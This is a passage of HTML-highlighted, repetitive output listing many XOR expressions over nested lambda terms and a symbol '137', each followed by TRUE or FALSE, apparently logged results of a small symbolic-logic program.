class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span 